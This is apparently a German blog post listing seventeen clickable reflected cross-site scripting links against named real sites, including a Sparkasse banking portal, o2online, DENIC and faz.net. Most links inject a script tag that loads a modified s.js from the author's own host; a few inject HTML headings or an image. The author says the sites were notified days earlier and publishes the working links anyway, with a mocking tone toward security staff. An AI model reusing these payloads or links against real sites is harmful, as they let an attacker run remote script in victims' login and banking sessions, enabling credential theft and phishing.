<html><body><p>Ich fürchte, ich habe zu lange geschwiegen und zu wenig getan (naja, getan hab ich schon einiges, nur nix veröffentlicht...).<br>
Auf jeden Fall hab ich von ha.ckers.org die s.js geklaut und etwas angepasst, dadurch kann man den ganzen Sicherheitsfutzies jetzt noch kräftiger eins auswischen. Aber klickt selbst:<br>
<br>
<a href="http://www.bvr.de/public.nsf/search.html?SearchView&amp;SearchOrder=1&amp;main=500&amp;SearchWV=TRUE&amp;query=%28*%22%3E%3Ch1%3Ejetzt%20weiss%20ich%20warum%20es%20soviel%20phishing%20gibt%3C/h1%3E*%29&amp;qorig=%22%3E%3Ch1%3Ejetzt%20weiss%20ich%2C%20warum%20es%20soviel%20phishing%20gibt%3C/h1%3E&amp;so=3&amp;start=1&amp;count=50" target="_blank">XSS in der Suche von bvr.de</a><br>
<a href="http://www.transtec.de/D/D/tools/search.html?q=%3Cscript%20src=%22http://files.die-welt.net/s.js%22%3E&amp;go=." target="_blank">XSS in der Suche von transtec.de</a><br>
<a href="http://pcgratis.de/suche.php?search=%3Cscript%20src=%22http://files.die-welt.net/s.js%22%3E&amp;x=0&amp;y=0" target="_blank">XSS in der Suche von pcgratis.de</a><br>
<a href="http://www.frag-mutti.de/search.php?search=%22%3E%3Cscript%20src=http://files.die-welt.net/s.js%3E&amp;submit=B" target="_blank">XSS in der Suche von frag-mutti.de</a><br>
<a href="http://www.frag-vati.de/search.php?search=%22%3E%3Cscript%20src=http://files.die-welt.net/s.js%3E&amp;submit=B" target="_blank">XSS in der Suche von frag-vati.de</a><br>
<a href="http://www.friendscout24.de/?username=%22%3E%3Cscript%20src=%22http://files.die-welt.net/s.js%22%3E&amp;password=&amp;md5hash=dooo" target="_blank">XSS im Login von friendscout24.de</a><br>
<a href="http://www.jobscout24.de/bewerber/LoginFailed.asp?err=%3Cscript%20src=%22http://files.die-welt.net/s.js%22%3" target="_blank">XSS in Login-Error von jobscout24.de</a><br>
<a href="http://www.denic.de/de/special/results.jsp?query=%22%3E%22%3Cscript%20src=%22http://files.die-welt.net/s.js%22%3E&amp;querypostfix=&amp;lang=de&amp;x=11&amp;y=13&amp;hpp=10" target="_blank">XSS in der Suche von denic.de</a><br>
<a href="https://login.o2online.de/loginRegistration/loginAction.do?_flowId=startLogin&amp;loginName=%22%3E%3Ch1%3ESicher?%3C/h1%3E" target="_blank">XSS im Login von o2online.de (HTTPS!)</a><br>
<a href="http://haerting.de/de/suche/index.php?we_lv_search_0=%3Cscript%20src=http://files.die-welt.net/s.js%3E" target="_blank">XSS in der Suche von haerting.de</a><br>
<a href="http://www.starkalender.de/sk/suche/index.html?daten%5Bsuche%5D=%3Cscript%20src=http://files.die-welt.net/s.js%3E&amp;imageField.x=0&amp;imageField.y=0" target="_blank">XSS in der Suche von starkalender.de</a><br>
<a href="http://www.titus.de/screen.phtml?screen=ws_extendedsearch&amp;Query=%22%3E%3Cscript%20src=%22http://files.die-welt.net/s.js%22%3E&amp;submitBut_x=0&amp;submitBut_y=0&amp;submitBut=1" target="_blank">XSS in der Suche von titus.de</a><br>
<a href="http://die-patrone.de/index.php?search_word_2=%27%3E%3Cimg%20src=http://www.billigdrucker.de/cImages/B0000AT4Z7.03.MZZZZZZZ.jpg%3E&amp;x=0&amp;y=0" target="_blank">XSS in der Suche von die-patrone.de (die ersetzen alle "-" mit " " aber lassen sonst alles zu!?)</a><br>
<a href="http://www.my-sad.com/sad/search.php?criteria=%3Cscript%20src=http://files.die-welt.net/s.js%3E" target="_blank">XSS in der Suche von my-sad.de</a><br>
<a href="http://www.faz.net/IN/INtemplates/faznet/pagenotfound.asp?err=%3Cscript%20src=%22http://files.die-welt.net/s.js%22%3E" target="_blank">XSS im 404-Error von faz.net</a><br>
<a href="https://bankingportal.sskduesseldorf.de/banking/FeLogout?AUFTRITT=%22%3E%3Cscript%20src=%22http://files.die-welt.net/s.js%22%3E" target="_blank">XSS im Logout-Screen von sskduesseldorf.de</a><br>
<a href="http://www.mdr.de/newsletter/login.html?f_username=%22%3E%3Cscript%20src=%22http://files.die-welt.net/s.js%22%3E&amp;f_action=login" target="_blank">XSS im Login von mdr.de</a><br>
<br>
Macht also 17 Links, unter anderem Zeitungen, OnlineShops, Fernsehsender und <strong>MEINE BANK</strong> OMFG!!!elf<br>
Diese habe ich übrigens am Montag um 11:30 angemailt, leider bis dato keine Rückmeldung und kein Fix. Schonnirgendwie traurig das Ganze.<br>
Aber am härtesten finde ich die zwei Links in der Mitte, DENIC und o2, beides Firmen die einen Teil ihres Vermögens im Internet machen, und dann so was? Gibt es noch echte Sicherheit auf der Welt oder leben wir alle in einer Matrix, die uns SSL-Schlösser vortäuscht und unsere Daten aus späht?</p></body></html>